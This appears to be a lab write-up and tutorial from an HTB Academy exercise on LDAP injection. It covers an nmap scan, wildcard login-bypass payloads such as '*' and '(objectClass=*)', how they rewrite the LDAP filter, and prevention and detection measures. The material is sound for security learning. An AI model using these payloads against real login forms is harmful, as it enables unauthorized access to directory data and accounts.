```markdown
# 🔍 LDAP Injection Attacks

> [!ABSTRACT] 🎯 Objective: Exploit LDAP injection vulnerabilities in web applications to bypass authentication and access sensitive directory information.

---

## Overview

> [!NOTE]
> **LDAP Injection** attacks target web applications that use **LDAP (Lightweight Directory Access Protocol)** for authentication or user management. By injecting special characters into LDAP queries, attackers can bypass authentication and manipulate directory searches.

---

## HTB Academy Lab Solution

### 🎯 Lab: Authentication Bypass
**Question:** "After bypassing the login, what is the website 'Powered by'?"

#### Step 1: Service Discovery

```bash
# Nmap scan to identify services
nmap -p- -sC -sV --open --min-rate=1000 TARGET

# Expected results:
# 80/tcp  open  http    Apache httpd 2.4.41 (Ubuntu)
# 389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
```

> [!SUCCESS] 
> **Expected Answer:** Framework/CMS name from "Powered by" text *(extract from bypassed page)*

#### Step 2: LDAP Injection Attack

```bash
# Navigate to login page
# URL: http://TARGET/

# LDAP injection payloads for authentication bypass:
Username: *
Password: *

# Alternative payloads:
Username: admin
Password: *

Username: *
Password: password
```

> [!CHECK]
> **Post-Authentication Analysis**
>
> ```bash
> # After successful login bypass, examine the page source
> # Look for "Powered by" information in:
> # - Page footer
> # - HTML comments  
> # - HTTP headers
> # - About/version pages
> ```

---

## LDAP Injection Techniques

### Common Injection Characters
```bash
# Special LDAP characters for injection
*       # Wildcard - matches any number of characters
( )     # Parentheses - group expressions  
|       # Logical OR operator
&       # Logical AND operator
```

### Authentication Bypass Payloads
```bash
# Wildcard injection
Username: *
Password: *

# Always-true conditions  
Username: (cn=*)
Password: anything

Username: (objectClass=*)
Password: anything
```

### Query Structure Manipulation
```text
# Original LDAP query:
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

# Injected query with *:
(&(objectClass=user)(sAMAccountName=*)(userPassword=*))
# Result: Matches any user with any password
```

---

## Technical Details

### LDAP Query Components
```text
# Standard authentication query structure
(&(objectClass=user)(uid=$username)(userPassword=$password))

# Components:
# & = AND operator
# objectClass=user = filter for user objects
# uid=$username = username field
# userPassword=$password = password field
```

### Injection Points

| Point | Description |
|---|---|
| Username fields | Primary injection vector |
| Password fields | Secondary injection vector |
| Search filters | Advanced injection opportunities |
| DN parameters | Distinguished Name manipulation |

### Vulnerable Applications

- **Web portals** using LDAP authentication
- **Enterprise applications** with AD integration
- **Custom applications** with poor input validation
- **Legacy systems** without proper sanitization

---

## Impact Assessment

**Authentication Bypass:**

| Impact | Description |
|---|---|
| Unauthorized access | Access to protected resources |
| Administrative privilege escalation | Escalation of privileges |
| User account enumeration | Enumeration of user accounts |
| Directory information disclosure | Exposure of directory data |

**Information Disclosure:**
- **User credentials and attributes** 
- **Organizational structure data**
- **Group memberships and permissions**
- **System configuration details**

**Attack Escalation:**
- **Lateral movement** through directory services
- **Privilege escalation** via group membership
- **Data exfiltration** from LDAP directory
- **Further application compromise**

---

## Detection & Mitigation

### Prevention

| Measure | Description |
|---|---|
| Input validation | Sanitize all user inputs |
| Parameterized queries | Use prepared statements |
| Least privilege | Limit LDAP service account permissions |
| Escape special characters | Remove LDAP metacharacters |

### Detection
- **Log analysis** - Monitor for LDAP query anomalies
- **Authentication monitoring** - Track failed/successful logins
- **Input validation testing** - Regular security assessments

> [!PRO TIP]
> **LDAP injection is often overlooked compared to SQL injection, but it's equally dangerous in enterprise environments with Active Directory integration - always test authentication forms with wildcard characters.**
```